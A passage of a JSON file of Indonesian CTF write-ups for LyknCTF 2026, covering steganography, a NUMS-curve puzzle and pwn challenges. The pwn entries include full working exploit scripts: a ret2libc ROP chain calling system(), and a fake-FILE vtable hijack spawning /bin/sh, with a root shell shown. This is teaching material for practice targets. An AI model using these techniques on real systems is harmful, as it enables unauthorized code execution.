        "code": "grep -oba $'\\x89PNG\\r\\n\\x1a\\n' lyknctf.mp4\ngrep -oba $'PK\\x03\\x04' lyknctf.mp4"
      },
      {
        "title": "4. Ambil password dari LSB cover",
        "content": "Bit terendah setiap channel gambar dibaca dengan urutan RGB. Setiap delapan bit digabungkan secara MSB-first menjadi satu byte.\n\n\n\nOutputnya langsung membentuk teks berulang:",
        "code": "from PIL import Image\n\nimage = Image.open(\"raw_cover.png\").convert(\"RGB\")\nbits = []\n\nfor r, g, b in image.getdata():\n    bits.extend((r & 1, g & 1, b & 1))\n\nmessage = bytearray()\nfor i in range(0, len(bits) - 7, 8):\n    value = 0\n    for bit in bits[i:i + 8]:\n        value = (value << 1) | bit\n    message.append(value)\n\nprint(bytes(message[:100]))"
      },
      {
        "title": "Password ZIP:",
        "content": "Nama ini juga nyambung dengan deskripsi: `Nem chua Thanh Hoa` merupakan frasa yang disisipkan ke gambar, bukan password hasil tebakan dari judul.",
        "code": "NEMCHUATHANHHOA"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "LYKNCTF{N3M_CHU4_TH4NH_H04_D4C_S4N_XU_TH4NH}"
      },
      {
        "title": "Solver otomatis",
        "content": "`solve.py` mengerjakan semua tahap berikut secara otomatis:\n\n1. Mencari PNG terakhir di dalam MP4.\n2. Mem-parse chunk PNG sampai `IEND`.\n3. Mengambil ZIP yang ditempel setelah PNG.\n4. Membaca LSB RGB untuk mendapatkan password.\n5. Mendekripsi WinZip AES dan mengekstrak `flag.txt`."
      },
      {
        "title": "Jalankan:",
        "content": "Output akhir:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py lyknctf.mp4"
      }
    ],
    "terminalOutputs": [],
    "flag": "Dengan `7z`:\n\n```bash\n7z x -pNEMCHUATHANHHOA hidden.zip\ncat flag.txt",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-foren-worldcup1",
    "title": "World Cup 1",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Writeup for challenge World Cup 1",
    "problemDescription": "",
    "tools": [],
    "analysis": "1. Cek metadata file `worldcup1_challenge.png` menggunakan `exiftool`.\n2. Ditemukan komentar metadata `The score was 3-2 after extra time` dan `Flag Hint: Look deeper in the red pixels`.\n3. Terdapat data tambahan di bagian akhir file PNG (trailer data setelah IEND chunk).",
    "solution": [],
    "terminalOutputs": [],
    "flag": "LYKNCTF{Argentina3-2CaboVerde}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-foren-worldcup2",
    "title": "World Cup 2",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Writeup for challenge World Cup 2",
    "problemDescription": "",
    "tools": [],
    "analysis": "File `worldcup2_challenge.png` dideteksi sebagai file JPEG oleh utilitas `file`.\nMenggunakan `binwalk` untuk memeriksa file tersemat:\n```bash\nbinwalk worldcup2_challenge.png\n```\nDitemukan adanya arsip ZIP di offset `283620` (0x453E4) yang berisi file `flag_hidden.txt`.",
    "solution": [
      {
        "title": "Solusi",
        "content": "Ekstraksi file menggunakan `unzip`:\n\nMembaca isi file `flag_hidden.txt` menghasilkan flag:\n`LYKNCTF{RespectToCaboVerde}`",
        "code": "unzip worldcup2_challenge.png"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{RespectToCaboVerde}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-misc-ellipticcurvecryptography",
    "title": "Elliptic Curve Cryptography",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Elliptic Curve Cryptography",
    "problemDescription": "",
    "tools": [],
    "analysis": "Petunjuk utama ada pada nilai `p`, `a`, dan koordinat `x` generator.\n\nPertama, ubah parameter menjadi integer dan periksa relasinya:\n\n```python\np = int(\"0fffffffffffffffffffffff67\", 16)\na = int(\"0fffffffffffffffffffffff64\", 16)\nx = int(\"00000000000000000000000001\", 16)\n\nprint(\"bit length:\", p.bit_length())\nprint(\"2^100 - p:\", (1 << 100) - p)\nprint(\"p - a:\", p - a)\nprint(\"x:\", x)\n```",
    "solution": [
      {
        "title": "Challenge",
        "content": "Diberikan sebuah parameter elliptic curve berukuran sekitar 100-bit:\n\n\n\nDeskripsinya hanya mengatakan:\n\n> the flag is hidden some where in this curve (100-bit?) look at the p,a and x params\n\nHint dari panitia:\n\n1. What’s the name of the paper include algorithm that generate that curve?\n2. マイクロソフト\n3. Parameter sebuah kurva berukuran 512-bit yang berisi `p`, `a`, `d`, `r`, `X(P)`, `Y(P)`, dan `h`.\n\nFlag format:\n\n\n\n---",
        "code": "[\n  {\n    \"field\": {\n      \"p\": \"0x0fffffffffffffffffffffff67\"\n    },\n    \"a\": \"0x0fffffffffffffffffffffff64\",\n    \"b\": \"0x00000000000000000000000abb\",\n    \"order\": \"0x0ffffffffffff918654d8534a1\",\n    \"subgroups\": [\n      {\n        \"x\": \"0x00000000000000000000000001\",\n        \"y\": \"0x05a0248e58b8beaa670036b766\",\n        \"order\": \"0xffffffffffff918654d8534a1\",\n        \"cofactor\": \"0x1\"\n      }\n    ]\n  }\n]"
      },
      {
        "title": "Hasilnya:",
        "content": "Jadi parameternya dapat ditulis sebagai:\n\n$$\np = 2^{100} - 153\n$$\n\n$$\na = p - 3 \\equiv -3 \\pmod p\n$$\n\ndan generator menggunakan:\n\n$$\nx = 1\n$$\n\nKombinasi ini terlihat terlalu terstruktur untuk menjadi parameter kurva acak.\n\nNilai prima dibuat dekat dengan pangkat dua, koefisien `a` menggunakan nilai sederhana `-3`, dan pencarian generator dimulai dari nilai `x` yang sangat kecil.\n\nArtinya, parameter tersebut kemungkinan dibuat menggunakan algoritma deterministik.\n\n---",
        "code": "bit length: 100\n2^100 - p: 153\np - a: 3\nx: 1"
      },
      {
        "title": "Mengikuti Hint Microsoft",
        "content": "Hint kedua adalah:\n\n\n\nTeks tersebut berarti **Microsoft**.\n\nHint ketiga memberikan parameter kurva yang jauh lebih besar. Setelah mencari bagian unik dari parameter tersebut, terutama nilai:\n\n\n\nparameter itu mengarah ke keluarga kurva milik Microsoft yang disebut **NUMS curves**.\n\nNUMS merupakan singkatan dari:\n\n\n\nKurva ini dibuat dengan parameter yang dipilih secara transparan dan deterministik, sehingga tidak menimbulkan kecurigaan adanya konstanta rahasia atau backdoor.\n\nKurva pada hint ketiga dikenali sebagai salah satu parameter NUMS, yaitu `numsp512t1`.\n\n---",
        "code": "マイクロソフト"
      },
      {
        "title": "Rabbit Hole Pertama: Menebak Nama Kurva",
        "content": "Karena challenge menggunakan kurva 100-bit dengan bentuk Weierstrass dan `a = -3`, muncul dugaan bahwa namanya mengikuti pola kurva NUMS lain:\n\n\n\nDengan pola tersebut, kurva challenge terlihat seperti versi kecil:\n\n\n\nPercobaan flag:\n\n\n\nNamun hasilnya salah.\n\nMasalahnya, `numsp100d1` bukan nama resmi kurva yang terdapat di spesifikasi. Itu hanya nama hasil ekstrapolasi dari pola penamaan kurva lain.\n\nChallenge juga tidak bertanya “what is the name of the curve”, tetapi secara spesifik bertanya:\n\n> What’s the name of the paper include algorithm that generate that curve?\n\nJadi target sebenarnya bukan nama kurva.\n\n---",
        "code": "numsp256d1\nnumsp384d1\nnumsp512d1"
      },
      {
        "title": "Rabbit Hole Kedua: Kepanjangan NUMS",
        "content": "Karena kurva tersebut berasal dari keluarga NUMS, percobaan berikutnya adalah menggunakan kepanjangannya:\n\n\n\nHasilnya juga salah.\n\nWalaupun frasa tersebut menjelaskan filosofi pemilihan parameternya, hint pertama tetap meminta nama paper atau dokumen yang berisi algoritma pembentukan kurva.\n\nBerarti kita harus mencari dokumen spesifik yang mendefinisikan NUMS curves.\n\n---",
        "code": "LYKNCTF{nothing_up_my_sleeve}"
      },
      {
        "title": "Menemukan Dokumen yang Tepat",
        "content": "Parameter pada hint ketiga ditemukan di dokumen Internet-Draft berjudul:\n\n\n\nIdentifier dokumennya adalah:\n\n\n\nDokumen tersebut menjelaskan proses pembentukan parameter NUMS, termasuk pemilihan:\n\n* prime field berbentuk dekat dengan (2^n),\n* koefisien kurva sederhana,\n* pencarian parameter dan generator secara deterministik,\n* titik generator dengan koordinat `x` kecil yang memenuhi syarat.\n\nIni cocok dengan parameter challenge:\n\n\n\nJadi flag tidak disembunyikan melalui operasi kriptografi terhadap titik kurva. Parameter tersebut digunakan sebagai fingerprint untuk mengidentifikasi algoritma dan dokumen yang membentuknya.\n\n---",
        "code": "Elliptic Curve Cryptography (ECC) Nothing Up My Sleeve (NUMS) Curves and Curve Generation"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{draft-black-numscurves-02}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-pwn-ezpwn",
    "title": "Ez Pwn — LYKN CTF 2026",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Category:** Pwn  \n**Difficulty:** Easy  \n**Target:** `15.235.202.47:8999`  \n**Flag:** `LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}`",
    "problemDescription": "> definitely the oldest trick in the book\n\nProgram meminta panjang input, menolak nilai di atas 80, lalu membaca data ke buffer stack. Validasi panjang terlihat aman, tetapi tipe integer yang dipakai saat pengecekan berbeda dengan tipe yang akhirnya diberikan ke `read()`.",
    "tools": [],
    "analysis": "Bagian penting di `main` kurang lebih setara dengan kode berikut:\n\n```c\nint length;\nchar size8;\nchar buffer[160];\n\nscanf(\"%d\", &length);\n\nif (length > 80) {\n    puts(\"So u want to overflow this challenge??\");\n    return 1;\n}\n\nsize8 = length;\nread(0, buffer, (unsigned char)size8);\n```\n\nDisassembly menunjukkan pengecekan signed integer:\n\n```asm\nmov eax, DWORD PTR [rbp-0x34]\ncmp eax, 0x50\njle 0x401286\n```\n\nSetelah lolos, hanya byte terendah yang disimpan:\n\n```asm\nmov eax, DWORD PTR [rbp-0x34]\nmov BYTE PTR [rbp-0x5], al\nmovzx edx, BYTE PTR [rbp-0x5]\nlea rax, [rbp-0xa0]\nmov rsi, rax\nmov edi, 0\ncall read@plt\n```\n\nNilai `-1` memenuhi kondisi `-1 <= 80`. Ketika dipotong menjadi satu byte, nilainya berubah menjadi `0xff` atau 255.\n\n```text\ninput integer : -1\nsigned check  : -1 <= 80\nuint8_t value : 255\nread size     : 255 bytes\n```\n\nBuffer berada di `[rbp-0xa0]` dan saved RIP berada di `[rbp+8]`, sehingga offset ke return address adalah:\n\n```text\n0xa0 + 8 = 0xa8 = 168 bytes\n```",
    "solution": [
      {
        "title": "Recon",
        "content": "",
        "code": "file chall\nchecksec --file=chall"
      },
      {
        "title": "Implikasinya:",
        "content": "- alamat gadget dan section binary bersifat tetap karena PIE mati;\n- shellcode langsung tidak cocok karena NX aktif;\n- tidak ada stack canary, jadi saved RIP bisa ditimpa langsung;\n- ROP dan ret2libc menjadi jalur paling sederhana."
      },
      {
        "title": "Gadget",
        "content": "Binary menyediakan gadget sederhana yang cukup untuk mengontrol argumen fungsi System V AMD64:\n\n\n\nKarena binary tidak memakai PIE, semua alamat tersebut tetap pada remote.",
        "code": "0x40117a : pop rdi ; ret\n0x40117c : pop rsi ; ret\n0x40117e : pop rdx ; ret\n0x40101a : ret"
      },
      {
        "title": "Strategi Exploit",
        "content": "Exploit akhir memakai tiga kali eksekusi `main`:\n\n1. leak alamat `puts` dari GOT;\n2. tulis command ke `.bss` memakai `read`;\n3. panggil `system(command)`."
      },
      {
        "title": "Stage 1 — Leak libc",
        "content": "ROP pertama memanggil:\n\n\n\nPayload intinya:\n\n\n\nContoh leak remote:\n\n\n\nOffset libc diperoleh dari sesi DynELF yang berhasil sebelumnya, kemudian dipakai pada solver final agar tidak perlu melakukan lebih dari seratus leak setiap koneksi:",
        "code": "puts(puts@got);\nmain();"
      },
      {
        "title": "Hasilnya:",
        "content": "Base libc harus page-aligned. Pemeriksaan `libc_base & 0xfff == 0` dipakai untuk menolak leak yang rusak.",
        "code": "libc base = 0x7a7811fd0000\nsystem    = 0x7a7812020d70"
      },
      {
        "title": "Stage 2 — Tulis command ke `.bss`",
        "content": "Section `.bss` dapat ditulis dan alamatnya tetap. Solver memakai `0x404700` sebagai tempat command:\n\n\n\nROP kedua menjalankan:",
        "code": "COMMAND_ADDR = 0x404700\nCOMMAND = (\n    b\"echo __EZPWN_BEGIN__; \"\n    b\"cat flag* /flag /app/flag* 2>/dev/null; \"\n    b\"echo __EZPWN_END__\\x00\"\n)"
      },
      {
        "title": "Sinkronisasi TCP",
        "content": "Mengirim command langsung setelah payload overflow tidak stabil. `read(0, buffer, 255)` boleh mengembalikan jumlah byte yang lebih pendek dari 255. Jika payload dan command terkirim terlalu berdekatan, sebagian command dapat ikut termakan oleh vulnerable `read()`.\n\nProgram mencetak fake flag setelah vulnerable `read()` selesai dan sebelum fungsi kembali ke ROP chain:\n\n\n\nBaris itu dipakai sebagai synchronization barrier:\n\n\n\nSaat fake flag sudah diterima, proses telah melewati vulnerable `read()` dan sedang menunggu pada `read()` milik ROP stage kedua.\n\nFake flag yang tertanam di binary bukan flag challenge. Overflow merusak variabel sentinel di stack sehingga program masuk ke branch yang mencetak string tersebut.",
        "code": "Here a fake flag for your effort: ..."
      },
      {
        "title": "Stage 3 — Jalankan `system`",
        "content": "ROP terakhir menjalankan command yang sudah disimpan di `.bss`:\n\n\n\nGadget `ret` tambahan menjaga alignment stack sebelum masuk ke libc.",
        "code": "payload = flat(\n    {\n        168: [\n            ret,\n            pop_rdi,\n            COMMAND_ADDR,\n            system_addr,\n            elf.sym[\"main\"],\n        ]\n    }\n)"
      },
      {
        "title": "Kenapa Tidak Memakai DynELF di Solver Final?",
        "content": "`puts(address)` dapat dijadikan arbitrary leak dan memang cukup untuk menjalankan `DynELF`. Percobaan awal berhasil menemukan `system()` setelah sekitar 101 leak, tetapi koneksi remote kadang terputus saat DynELF sedang membaca tabel ELF libc.\n\nSetelah offset `puts` dan `system` diketahui dari libc remote, satu leak GOT sudah cukup. Metode ini lebih cepat dan jauh lebih stabil:",
        "code": "DynELF       : sekitar 100+ leak per attempt\none-leak     : 1 leak puts@GOT"
      },
      {
        "title": "Menjalankan Solver",
        "content": "Output remote:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py 15.235.202.47 8999 --binary './chall'"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport re\r\nimport time\r\n\r\nfrom pwn import *\r\n\r\nHOST = \"15.235.202.47\"\r\nPORT = 8999\r\n\r\nOFFSET = 168\r\nMAX_READ = 0xff\r\n\r\n# Offset libc remote, diidentifikasi dari hasil DynELF sebelumnya.\r\nPUTS_OFFSET = 0x80E50\r\nSYSTEM_OFFSET = 0x50D70\r\n\r\nPROMPT = b\"Let me know the length of your buffer: \\n\"\r\nINPUT_PROMPT = b\"> \\n\"\r\nFAKE_PREFIX = b\"Here a fake flag for your effort: \"\r\n\r\nCOMMAND_ADDR = 0x404700\r\nCOMMAND = (\r\n    b\"echo __EZPWN_BEGIN__; \"\r\n    b\"cat flag* /flag /app/flag* 2>/dev/null; \"\r\n    b\"echo __EZPWN_END__\\x00\"\r\n)\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"host\", nargs=\"?\", default=HOST)\r\n    parser.add_argument(\"port\", nargs=\"?\", type=int, default=PORT)\r\n    parser.add_argument(\"--binary\", default=\"./chall\")\r\n    parser.add_argument(\"--local\", action=\"store_true\")\r\n    parser.add_argument(\"--tries\", type=int, default=8)\r\n    parser.add_argument(\"--debug\", action=\"store_true\")\r\n    args = parser.parse_args()\r\n\r\n    context.binary = elf = ELF(args.binary, checksec=False)\r\n    context.arch = \"amd64\"\r\n    context.log_level = \"debug\" if args.debug else \"info\"\r\n\r\n    rop = ROP(elf)\r\n\r\n    pop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\r\n    pop_rsi = rop.find_gadget([\"pop rsi\", \"ret\"]).address\r\n    pop_rdx = rop.find_gadget([\"pop rdx\", \"ret\"]).address\r\n    ret = rop.find_gadget([\"ret\"]).address\r\n\r\n    if args.local:\r\n        libc = elf.libc\r\n        puts_offset = libc.sym[\"puts\"]\r\n        system_offset = libc.sym[\"system\"]\r\n    else:\r\n        puts_offset = PUTS_OFFSET\r\n        system_offset = SYSTEM_OFFSET\r\n\r\n    def connect():\r\n        if args.local:\r\n            return process(elf.path)\r\n        return remote(args.host, args.port, timeout=8)\r\n\r\n    def begin_round(io) -> None:\r\n        io.recvuntil(PROMPT)\r\n        io.sendline(b\"-1\")\r\n        io.recvuntil(INPUT_PROMPT)\r\n\r\n    def send_overflow(io, payload: bytes) -> None:\r\n        if len(payload) > MAX_READ:\r\n            raise ValueError(\r\n                f\"payload terlalu panjang: {len(payload)} > {MAX_READ}\"\r\n            )\r\n\r\n        io.send(payload.ljust(MAX_READ, b\"X\"))\r\n\r\n    def consume_fake_line(io) -> bytes:\r\n        io.recvuntil(FAKE_PREFIX)\r\n        return io.recvuntil(b\"\\n\", drop=True)\r\n\r\n    def exploit() -> bytes:\r\n        io = connect()\r\n\r\n        try:\r\n            # Stage 1: leak puts@GOT.\r\n            begin_round(io)\r\n\r\n            leak_payload = flat(\r\n                {\r\n                    OFFSET: [\r\n                        pop_rdi,\r\n                        elf.got[\"puts\"],\r\n                        elf.plt[\"puts\"],\r\n                        elf.sym[\"main\"],\r\n                    ]\r\n                }\r\n            )\r\n\r\n            send_overflow(io, leak_payload)\r\n            consume_fake_line(io)\r\n\r\n            raw_leak = io.recvuntil(b\"\\n\", drop=True)\r\n\r\n            if not 4 <= len(raw_leak) <= 6:\r\n                raise RuntimeError(\r\n                    f\"leak puts tidak valid: {raw_leak!r}\"\r\n                )\r\n\r\n            puts_addr = u64(raw_leak.ljust(8, b\"\\x00\"))\r\n            libc_base = puts_addr - puts_offset\r\n\r\n            if libc_base & 0xfff:\r\n                raise RuntimeError(\r\n                    f\"libc base tidak page-aligned: {libc_base:#x}\"\r\n                )\r\n\r\n            system_addr = libc_base + system_offset\r\n\r\n            log.success(f\"puts        = {puts_addr:#x}\")\r\n            log.success(f\"libc base   = {libc_base:#x}\")\r\n            log.success(f\"system      = {system_addr:#x}\")\r\n\r\n            # Stage 2: tulis command ke .bss.\r\n            begin_round(io)\r\n\r\n            write_payload = flat(\r\n                {\r\n                    OFFSET: [\r\n                        pop_rdx,\r\n                        len(COMMAND),\r\n                        pop_rsi,\r\n                        COMMAND_ADDR,\r\n                        pop_rdi,\r\n                        0,\r\n                        elf.plt[\"read\"],\r\n                        elf.sym[\"main\"],\r\n                    ]\r\n                }\r\n            )\r\n\r\n            send_overflow(io, write_payload)\r\n\r\n            # Baris fake flag menandakan vulnerable read() sudah selesai.\r\n            consume_fake_line(io)\r\n\r\n            # ROP sekarang menunggu di read(0, COMMAND_ADDR, len(COMMAND)).\r\n            io.send(COMMAND)\r\n\r\n            # Stage 3: system(COMMAND_ADDR).\r\n            begin_round(io)\r\n\r\n            execute_payload = flat(\r\n                {\r\n                    OFFSET: [\r\n                        ret,\r\n                        pop_rdi,\r\n                        COMMAND_ADDR,\r\n                        system_addr,\r\n                        elf.sym[\"main\"],\r\n                    ]\r\n                }\r\n            )\r\n\r\n            send_overflow(io, execute_payload)\r\n\r\n            return io.recvall(timeout=6)\r\n\r\n        finally:\r\n            try:\r\n                io.close()\r\n            except Exception:\r\n                pass\r\n\r\n    for attempt in range(1, args.tries + 1):\r\n        log.info(f\"attempt {attempt}/{args.tries}\")\r\n\r\n        try:\r\n            output = exploit()\r\n            print(output.decode(errors=\"replace\"))\r\n\r\n            match = re.search(rb\"LYKNCTF\\{[^}\\r\\n]+\\}\", output)\r\n\r\n            if match:\r\n                flag = match.group().decode()\r\n                print(f\"<FLAG>{flag}</FLAG>\")\r\n                return 0\r\n\r\n            log.warning(\"Command jalan, tapi flag belum terdeteksi\")\r\n\r\n        except (EOFError, OSError, RuntimeError, ValueError) as exc:\r\n            log.warning(f\"retry: {exc}\")\r\n\r\n        time.sleep(0.3)\r\n\r\n    log.failure(\"Semua attempt gagal\")\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{If_y0u_can_s0lv3_Thi5_chall_Th3n_y0ur3_4n_4bs0lute_femb1}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-pwn-ezpwnrevenge",
    "title": "ez pwn revenge",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Pwn  \n**Difficulty:** Medium  \n**Target:** `15.235.202.47:8996`  \n**Flag:** `LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}`",
    "problemDescription": "> :sob:\n\nProgram meminta panjang buffer, membaca data ke area global, lalu memanggil fungsi penutup file buatan sendiri. Bug signed-to-unsigned membuat input `-1` berubah menjadi ukuran baca `255`, cukup untuk menimpa fake `FILE` object dan function pointer-nya.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Proteksi binary:\n\n\n\nSimbol yang relevan:\n\n\n\nKarena binary non-PIE, alamat `system@plt` dan buffer global selalu tetap.",
        "code": "file chall\nchecksec --file=chall\nnm -n chall"
      },
      {
        "title": "Signed Length Truncation",
        "content": "Potongan logika di `main`:\n\n\n\nPengecekan hanya menolak nilai di atas `80`. Nilai negatif tetap lolos.",
        "code": "int length;\nunsigned char read_size;\n\nscanf(\"%d\", &length);\n\nif (length > 80) {\n    puts(\"So u want to overflow this challenge??\");\n    return 1;\n}\n\nread_size = length;\nread(0, box, read_size);"
      },
      {
        "title": "Input:",
        "content": "disimpan sebagai integer `-1`, kemudian dipotong menjadi satu byte:\n\n\n\nHasilnya, `read()` menerima ukuran `255` dan menulis mulai dari `box` di `0x404040`.",
        "code": "-1"
      },
      {
        "title": "Layout Global",
        "content": "`init_fake_file()` menyiapkan object buatan sendiri di area `box`.\n\n\n\nSetelah pembacaan, program memanggil:",
        "code": "box + 0x00  area yang bisa dipakai sebagai fake vtable\nbox + 0x50  safety flag\nbox + 0x58  magic value\nbox + 0x60  awal fake FILE\nbox + 0xA8  fake_file + 0x48, pointer vtable"
      },
      {
        "title": "`custom_fclose`",
        "content": "Alur sederhananya:\n\n\n\nField yang dipakai:\n\n\n\nJalur paling pendek adalah membuat pengecekan magic gagal. Program lalu mengambil function pointer kedua dari fake vtable:\n\n\n\nArgumen pertama callback adalah alamat fake object itu sendiri.",
        "code": "void custom_fclose(fake_file *fp) {\n    if (fp == NULL || fp->vtable == NULL)\n        return;\n\n    if ((fp->flags & 0xffff0000) == 0xfbad0000 &&\n        fp->write_base > fp->write_ptr) {\n        fp->vtable->overflow(fp);\n    } else {\n        fp->vtable->finish(fp);\n    }\n}"
      },
      {
        "title": "Membentuk `system(\"/bin/sh\")`",
        "content": "Fake object dimulai di:\n\n\n\nTaruh string `/bin/sh\\0` pada awal object tersebut. Saat callback dipanggil:\n\n\n\nFunction pointer callback kedua diisi dengan:\n\n\n\nVtable palsu ditempatkan di awal `box`, lalu pointer pada `fake_file + 0x48` diarahkan ke sana.\n\nOffset payload:",
        "code": "box + 0x60 = 0x4040a0"
      },
      {
        "title": "Solver",
        "content": "Tes lokal:\n\n\n\nSetelah shell terbuka:",
        "code": "python3 solve.py"
      },
      {
        "title": "Validasi Lokal",
        "content": "Payload yang sama menghasilkan shell root:",
        "code": "Let's me check if you are safe or not!\nYou doing it right. Are you?\nYour overflow attempt is 999999\nPWN_OK\nuid=0(root) gid=0(root) groups=0(root)\nbye."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\nHOST = \"15.235.202.47\"\r\nPORT = 8996\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"debug\"\r\n\r\nBOX = 0x404040\r\nSYSTEM_PLT = 0x401040\r\n\r\n\r\ndef start():\r\n    if args.LOCAL:\r\n        exe = args.EXE or \"./chall\"\r\n        return process(exe)\r\n\r\n    return remote(HOST, PORT)\r\n\r\n\r\ndef build_payload():\r\n    payload = bytearray(255)\r\n\r\n    # Fake vtable diletakkan di awal box.\r\n    # custom_fclose mengambil callback kedua dari vtable + 8.\r\n    payload[0x08:0x10] = p64(SYSTEM_PLT)\r\n\r\n    # box + 0x50 harus tetap 0 agar lolos safety check.\r\n    payload[0x50:0x54] = p32(0)\r\n\r\n    # Fake FILE dimulai pada box + 0x60.\r\n    # Pointer ini diteruskan sebagai argumen pertama callback,\r\n    # jadi system() akan menerima \"/bin/sh\".\r\n    payload[0x60:0x68] = b\"/bin/sh\\x00\"\r\n\r\n    # fake_file + 0x10 dibuat 0 agar masuk jalur callback kedua.\r\n    payload[0x70:0x78] = p64(0)\r\n\r\n    # fake_file + 0x48 menunjuk fake vtable di BOX.\r\n    payload[0xA8:0xB0] = p64(BOX)\r\n\r\n    return bytes(payload)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n\r\n    # Signed check menerima -1 karena -1 <= 80.\r\n    # Nilai kemudian dipotong ke uint8 sehingga menjadi 255.\r\n    io.sendlineafter(b\"buffer:\", b\"-1\")\r\n\r\n    payload = build_payload()\r\n    assert len(payload) == 255\r\n\r\n    io.sendafter(b\"> \\n\", payload)\r\n\r\n    log.success(\"Shell spawned\")\r\n    io.interactive()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-pwn-glyphcache",
    "title": "Glyph Cache",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Pwn  \n**Difficulty:** Medium  \n**Target:** `15.235.202.47:9001`  \n**Flag:** `LYKNCTF{i_hope_you_love_it_https://open.spotify.com/track/7wyBHQWBpLJAPczbzcZ8PU?si=4f200d018d6845a3}`",
    "problemDescription": "> I hope this easy enough for beginners to solve :D\n\nProgram mensimulasikan renderer kecil dengan cache untuk DOM, style, layout, dan paint. `optimize` dapat membebaskan arena style yang sudah retired tanpa membuang paint cache ketika hash layout tidak berubah. Paint cache akhirnya menyimpan pointer ke `ComputedStyle` yang sudah bebas.\n\nUAF tersebut memberi dua hal sekaligus:\n\n1. leak libc dan heap melalui `inspect paint raw`;\n2. function pointer control setelah chunk direbut kembali lewat `profile add`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Isi arsip:\n\n\n\nProteksi binary:\n\n\n\nProgram menyediakan command berikut:\n\n\n\nSimbol yang membantu analisis:",
        "code": "public/chall\npublic/libc.so.6\npublic/ld-linux-x86-64.so.2\npublic/run.sh"
      },
      {
        "title": "Struktur Style dan Filter",
        "content": "`rebuild_style()` membuat satu arena dengan empat alokasi:\n\n\n\nDua block berukuran `0x430` diisi sebagai `ComputedStyle`. Field yang dipakai saat render:\n\n\n\n`fill_style()` normalnya mengisi field tersebut dengan alamat filter aman global.\n\nFilter mempunyai layout minimal:\n\n\n\nBagian penting dari `render`:\n\n\n\nFunction pointer dipanggil dengan teks dari command `load` sebagai argumen pertama.",
        "code": "malloc(0x430);  // style block A\nmalloc(0x20);\nmalloc(0x430);  // style block B\nmalloc(0x20);"
      },
      {
        "title": "Bug UAF pada Paint Cache",
        "content": "Urutan normal:\n\n\n\n`paint` menyimpan pointer ke style aktif ke dalam paint cache.\n\nSaat menjalankan:\n\n\n\nstyle lama menjadi retired dan style baru dibuat pada arena lain. Paint cache masih menunjuk style lama.",
        "code": "load <document>\nstyle one\nlayout\npaint"
      },
      {
        "title": "Kemudian:",
        "content": "Jika hash layout belum berubah, program menampilkan:\n\n\n\nWalaupun cache dipertahankan, dua block `0x430` milik arena retired tetap dipanggil `free()`. Pointer style di paint cache sekarang dangling.",
        "code": "optimize"
      },
      {
        "title": "Leak Unsorted Bin dan Heap",
        "content": "Ukuran request `0x430` menghasilkan chunk glibc berukuran `0x440`, lebih besar dari batas tcache. Kedua chunk masuk ke unsorted bin.\n\nKarena block A dibebaskan lebih dulu dan block B setelahnya, metadata pada user data block A menjadi:\n\n\n\nCommand berikut mencetak 0x50 byte dari pointer style stale:",
        "code": "A + 0x00 = fd -> main_arena\nA + 0x08 = bk -> header chunk B"
      },
      {
        "title": "Contoh:",
        "content": "Parsing leak:\n\n\n\nOffset `0x203b20` berasal dari `libc.so.6` yang dibundel bersama challenge.",
        "code": "[inspect] paint[0] node=1 text_len=15 raw=\n203be0f0e47e000010170b281b560000..."
      },
      {
        "title": "Reclaim dengan `profile add`",
